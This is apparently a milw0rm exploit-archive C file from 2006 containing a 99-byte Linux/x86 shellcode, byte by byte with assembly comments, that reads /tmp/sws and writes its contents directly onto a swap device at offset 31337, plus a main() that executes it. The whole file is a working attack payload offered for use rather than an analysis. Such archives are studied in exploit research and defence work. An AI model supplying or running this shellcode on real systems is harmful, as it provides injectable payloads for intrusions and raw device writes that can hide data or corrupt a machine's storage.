/*
 * linux-x86-swap-store.c - SWAP store shellcode 99 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security & rfdslabs
 *
 * Authors:
 *
 *	dx 	<xgc@gotfault.net>
 *	spud	<gustavo@rfdslabs.com.br>
 *
 * This shellcode reads the content of '/tmp/sws' and stores on swap
 * device at offset 31337. Probaly needs to change the device path name
 * in open() device syscall.
 *
 */

char shellcode[] =

  /* open(device, O_WRONLY) */

  "\x6a\x05"                    // push   $0x5
  "\x58"                        // pop    %eax
  "\x99"                        // cltd
  "\x52"                        // push   %edx
  "\x68\x73\x64\x61\x31"        // push   $0x31616473
  "\x68\x64\x65\x76\x2f"        // push   $0x2f766564
  "\x66\x68\x2f\x2f"            // pushw  $0x2f2f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\x6a\x01"                    // push   $0x1
  "\x59"                        // pop    %ecx
  "\xcd\x80"                    // int    $0x80

  "\x97"                        // xchg   %eax,%edi

  /* open("/tmp/sws", O_RDONLY) */

  "\x49"                        // dec    %ecx
  "\x52"                        // push   %edx
  "\x68\x2f\x73\x77\x73"        // push   $0x7377732f
  "\x68\x2f\x74\x6d\x70"        // push   $0x706d742f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\x6a\x05"                    // push   $0x5
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x93"                        // xchg   %eax,%ebx

  /* read(fd_filename, *buf, 256) */

  "\x89\xe1"                    // mov    %esp,%ecx
  "\x42"                        // inc    %edx
  "\xc1\xe2\x0a"                // shl    $0xa,%edx
  "\x6a\x03"                    // push   $0x3
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x96"                        // xchg   %eax,%esi

  /* close(fd_filename) */

  "\x6a\x06"                    // push   $0x6
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x92"                        // xchg   %eax,%edx

  /* lseek(fd_device, 31337, SEEK_SET) */

  "\x31\xc9"                    // xor    %ecx,%ecx
  "\x6a\x13"                    // push   $0x13
  "\x58"                        // pop    %eax
  "\x89\xfb"                    // mov    %edi,%ebx
  "\x66\xb9\x69\x7a"            // mov    $0x7a69,%cx
  "\xcd\x80"                    // int    $0x80

  /* write(fd_device, *buf, 1025) */


  "\x89\x14\x34"                // mov    %edx,(%esp,%esi,1)
  "\x6a\x04"                    // push   $0x4
  "\x58"                        // pop    %eax
  "\x54"                        // push   %esp
  "\x59"                        // pop    %ecx
  "\x56"                        // push   %esi
  "\x5a"                        // pop    %edx
  "\x42"                        // inc    %edx
  "\xcd\x80"                    // int    $0x80

  /* close(fd_device) */

  "\xb0\x06"                    // mov    $0x6,%al
  "\xcd\x80"                    // int    $0x80

  /* exit(anything) */

  "\xb0\x01"                    // mov    $0x1,%al
  "\xcd\x80"                    // int    $0x80
;

int main() {

        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}

// milw0rm.com [2006-04-16]